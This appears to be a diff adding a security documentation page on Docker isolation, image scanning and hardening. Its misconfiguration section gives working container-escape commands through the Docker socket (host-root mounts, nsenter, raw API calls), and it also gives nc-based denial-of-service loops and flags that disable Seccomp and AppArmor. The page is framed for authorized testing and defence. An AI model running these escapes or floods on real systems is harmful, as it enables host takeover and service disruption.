@@ -1,0 +1,262 @@
+---
+title: "Docker Security"
+description: "Docker security architecture, container isolation mechanisms, breakout techniques, and hardening best practices"
+---
+
+## Overview
+
+Docker uses Linux kernel namespaces, cgroups, capability dropping, Seccomp, and SELinux/AppArmor to isolate containers. Understanding both the protections and their weaknesses is essential for container security assessments.
+
+<Warning>
+Container escape techniques described here are for authorized penetration testing only. Never test on systems you do not have explicit written permission to assess.
+</Warning>
+
+## Docker Engine Security Fundamentals
+
+The Docker engine provides security through multiple layers:
+
+<CardGroup cols={2}>
+  <Card title="Namespaces" icon="box">
+    Isolate process trees, network stacks, mount points, IPC, and UTS from the host and other containers.
+  </Card>
+  <Card title="Control Groups (cgroups)" icon="gauge">
+    Limit CPU, memory, I/O, and network bandwidth per container to prevent resource exhaustion.
+  </Card>
+  <Card title="Capability Dropping" icon="shield-minus">
+    Containers drop sensitive capabilities at startup. Remaining caps include: `cap_chown`, `cap_net_bind_service`, `cap_setuid`, etc.
+  </Card>
+  <Card title="Seccomp" icon="lock">
+    The default Docker Seccomp profile blocks ~44 syscalls. Custom profiles can restrict further.
+  </Card>
+</CardGroup>
+
+### Default Remaining Capabilities
+
+```
+cap_chown, cap_dac_override, cap_fowner, cap_fsetid, cap_kill,
+cap_setgid, cap_setuid, cap_setpcap, cap_net_bind_service,
+cap_net_raw, cap_sys_chroot, cap_mknod, cap_audit_write, cap_setfcap
+```
+
+## Secure Access to the Docker Engine
+
+By default, Docker listens on a Unix socket at `unix:///var/run/docker.sock`. To enable remote access securely:
+
+```bash
+DOCKER_OPTS="-D -H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
+sudo service docker restart
+```
+
+<Note>
+Always use HTTPS with mutual TLS for remote Docker API access. Never expose the Docker daemon over plain HTTP.
+</Note>
+
+## Image Security
+
+### Scanning for Vulnerabilities
+
+<Tabs>
+  <Tab title="docker scan">
+    ```bash
+    docker scan hello-world
+    ```
+  </Tab>
+  <Tab title="trivy">
+    ```bash
+    trivy -q -f json <container_name>:<tag>
+    ```
+  </Tab>
+  <Tab title="snyk">
+    ```bash
+    snyk container test <image> --json-file-output=<output> --severity-threshold=high
+    ```
+  </Tab>
+  <Tab title="clair-scanner">
+    ```bash
+    clair-scanner -w example-alpine.yaml --ip YOUR_LOCAL_IP alpine:3.5
+    ```
+  </Tab>
+</Tabs>
+
+### Docker Content Trust (Image Signing)
+
+```bash
+# Enable content trust — only signed images can be pulled/run
+export DOCKER_CONTENT_TRUST=1
+
+# Backup private keys
+tar -zcvf private_keys_backup.tar.gz ~/.docker/trust/private
+```
+
+## Container Resource Limits
+
+```bash
+# Run container with resource limits
+docker run -it \
+  -m 500M \
+  --kernel-memory 50M \
+  --cpu-shares 512 \
+  --blkio-weight 400 \
+  --name ubuntu1 ubuntu bash
+
+# Inspect cgroups for a running container
+docker run -dt --rm debian sleep 1234
+ps -ef | grep 1234
+ls -l /proc/<PID>/ns
+```
+
+## Dangerous Flags and Misconfigurations
+
+<AccordionGroup>
+  <Accordion title="--privileged Flag">
+    The `--privileged` flag gives the container nearly all host capabilities and disables Seccomp/AppArmor:
+
+    ```bash
+    docker run --privileged -it ubuntu bash
+    # Inside the container — full host access
+    mount /dev/sda1 /mnt
+    ```
+
+    This is the most dangerous Docker misconfiguration. Avoid it entirely in production.
+  </Accordion>
+
+  <Accordion title="Writable Docker Socket">
+    If the Docker socket `/var/run/docker.sock` is mounted inside a container or accessible to a non-root user, full host compromise is trivial:
+
+    ```bash
+    # Escape via CLI
+    docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+
+    # Escape via privileged container with host PID namespace
+    docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian \
+      nsenter -t 1 -m -u -n -i sh
+    ```
+
+    Using only the API (no Docker CLI):
+    ```bash
+    # List images
+    curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
+
+    # Create container mounting host root
+    curl -XPOST -H "Content-Type: application/json" \
+      --unix-socket /var/run/docker.sock \
+      -d '{"Image":"ubuntu","Cmd":["/bin/sh"],"OpenStdin":true,
+           "Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' \
+      http://localhost/containers/create
+    ```
+  </Accordion>
+
+  <Accordion title="no-new-privileges Security Option">
+    Prevent SUID abuse inside containers:
+
+    ```bash
+    docker run -it --security-opt=no-new-privileges:true myimage
+    ```
+  </Accordion>
+
+  <Accordion title="Capability Management">
+    ```bash
+    # Drop all capabilities, add only what is needed
+    docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myimage
+
+    # Disable Seccomp
+    docker run --security-opt seccomp=unconfined myimage
+
+    # Disable AppArmor
+    docker run --security-opt apparmor=unconfined myimage
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## SELinux in Docker
+
+SELinux adds label-based mandatory access control on top of Docker's isolation:
+
+| Label | Applied To |
+|-------|-----------|
+| `container_t` | Container processes (assigned by container engine) |
+| `container_file_t` | Files inside containers |
+
+Policy rules ensure `container_t` processes only interact with `container_file_t` objects, limiting damage from compromised containers.
+
+## DoS from a Container
+
+Demonstrate container resource limits matter:
+
+```bash
+# CPU DoS
+docker run -d --name malicious -c 512 busybox sh -c 'while true; do :; done'
+
+# Bandwidth DoS
+nc -lvp 4444 >/dev/null &
+while true; do cat /dev/urandom | nc <target_IP> 4444; done
+```
+
+## Secrets Management
+
+<Steps>
+  <Step title="Avoid Environment Variables for Secrets">
+    Environment variables are visible via `docker inspect` and in process listings. Never store secrets this way.
+  </Step>
+
+  <Step title="Use Docker Secrets">
+    ```yaml
+    # docker-compose.yml
+    version: "3.7"
+    services:
+      my_service:
+        image: centos:7
+        entrypoint: "cat /run/secrets/my_secret"
+        secrets:
+          - my_secret
+    secrets:
+      my_secret:
+        file: ./my_secret_file.txt
+    ```
+  </Step>
+
+  <Step title="BuildKit Build-Time Secrets">
+    ```bash
+    export DOCKER_BUILDKIT=1
+    docker build --secret my_key=my_value,src=path/to/secret .
+    ```
+  </Step>
+</Steps>
+
+## Advanced Container Runtimes
+
+<CardGroup cols={2}>
+  <Card title="gVisor" icon="server">
+    A Go-based application kernel (`runsc`) that intercepts and handles syscalls in user space, providing strong isolation. Integrates with Docker and Kubernetes.
+  </Card>
+  <Card title="Kata Containers" icon="microchip">
+    Runs containers inside lightweight VMs using hardware virtualization as a second isolation layer. Combines container speed with VM security boundaries.
+  </Card>
+</CardGroup>
+
+## Hardening Summary
+
+<Note>
+Run [docker-bench-security](https://github.com/docker/docker-bench-security) against your Docker host to automatically audit dozens of CIS Docker Benchmark checks.
+</Note>
+
+**Essential hardening practices:**
+
+- Never use `--privileged` or mount the Docker socket inside containers
+- Run containers as non-root users with user namespaces enabled
+- Drop all capabilities (`--cap-drop=ALL`) and add only required ones
+- Use `--security-opt=no-new-privileges` to block SUID escalation
+- Set resource limits (`--memory`, `--cpu-shares`) on all containers
+- Apply Seccomp and AppArmor profiles
+- Use official signed images only; enable Docker Content Trust
+- Regularly rebuild images to apply security patches
+- Use separate containers per microservice
+- Never put SSH inside a container; use `docker exec` instead
+
+## References
+
+- [Understanding Docker Container Escapes — Trail of Bits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
+- [Docker Security Documentation](https://docs.docker.com/engine/security/)
+- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker/)
+- [gVisor](https://github.com/google/gvisor)
+- [Kata Containers](https://katacontainers.io/)
